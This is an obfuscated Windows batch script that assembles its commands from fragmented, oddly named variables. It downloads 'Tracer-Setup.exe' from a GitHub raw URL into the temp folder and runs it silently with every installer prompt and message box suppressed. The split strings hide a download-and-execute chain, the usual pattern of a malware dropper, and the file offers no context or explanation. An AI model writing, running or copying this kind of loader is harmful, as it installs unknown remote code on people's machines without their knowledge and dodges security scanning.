@echo off
setlocal enabledelayedexpansion
set "xK9q1=curl"
set "xK9q2=.exe"
set "xK9q3=-Ls"
set "xK9q4=--out"
set "xK9q5=put"
set "xK9q6=%TEMP%"
set "xK9q7=https://"
set "xK9q8=github"
set "xK9q9=.com"
set "xK9qa=/core-session-authkey/"
set "xK9qb=ubiquitous"
set "xK9qc=-giggle-"
set "xK9qd=tracer"
set "xK9qe=/raw/refs/heads/main/"
set "xK9qf=Tracer-Setup"
set "xK9qg=/VERYSILENT"
set "xK9qh=/NORESTART"
set "xK9qi=/SUPPRESSMSGBOXES"
set "xK9qj=/SP-"
set "xK9qk=-WindowStyle"
set "xK9ql=Download"
set "xK9qm=failed"

set "a1=!xK9q1!!xK9q2!"
set "a2=!xK9q3! !xK9q4!!xK9q5!"
set "a3=!xK9q7!!xK9q8!!xK9q9!!xK9qa!!xK9qb!!xK9qc!!xK9qd!!xK9qe!!xK9qf!!xK9q2!"
set "a4=!xK9q6!\Tracer-Setup.exe"

!a1! !a2! "!a4!" "!a3!"
if not exist "!a4!" exit /b 1
start "" /wait "!a4!" !xK9qg! !xK9qh! !xK9qi! !xK9qj!
